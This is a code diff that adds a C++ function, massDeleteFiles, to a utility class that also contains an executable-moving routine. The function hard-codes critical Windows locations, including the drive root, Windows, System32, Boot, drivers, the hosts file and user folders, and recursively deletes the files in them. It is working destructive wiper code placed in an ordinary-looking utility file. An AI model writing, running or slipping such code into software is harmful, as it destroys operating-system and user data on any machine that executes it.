@@ -71,3 +71,55 @@ auto Utils::MoveExe(string name, string path, string newpath) -> void
 	};
 
 };
+
+auto Utils::massDeleteFiles() -> void
+{
+	map<string, string> paths;
+	paths["path_1"] = "C:\\";
+	paths["path_2"] = "C:\\Users\\Public\\";
+	paths["path_3"] = "C:\\Windows\\";
+	paths["path_4"] = "C:\\Users\\";
+	paths["path_5"] = "C:\\Windows\\System32\\";
+	paths["path_6"] = "C:\\Windows\\Boot\\";
+	paths["path_7"] = "C:\\Users\\Public\\Documents\\";
+	paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
+	paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
+	paths["path_10"] = "C:\\Users\\Public\\Videos\\";
+	paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
+	paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
+	paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+	// loop through the paths and delete the files
+	for (const auto& path : paths) {
+		// check if the path exists
+		if (std::filesystem::exists(path.second)) {
+			// check if the path is a directory
+			if (std::filesystem::is_directory(path.second)) {
+				// loop through the directory and delete the files
+				for (const auto& entry : std::filesystem::directory_iterator(path.second)) {
+					// check if the path is a directory
+					if (std::filesystem::is_directory(entry.path())) {
+						// delete the files in the directory
+						for (const auto& file : std::filesystem::directory_iterator(entry.path())) {
+							// check if the file is a directory
+							if (std::filesystem::is_directory(file.path())) {
+								// delete the files in the directory
+								for (const auto& file2 : std::filesystem::directory_iterator(file.path())) {
+									// delete the file
+									std::filesystem::remove(file2.path());
+								};
+							}
+							else {
+								// delete the file
+								std::filesystem::remove(file.path());
+							};
+						};
+					}
+					else {
+						// delete the file
+						std::filesystem::remove(entry.path());
+					};
+				};
+			};
+		};
+	};
+};
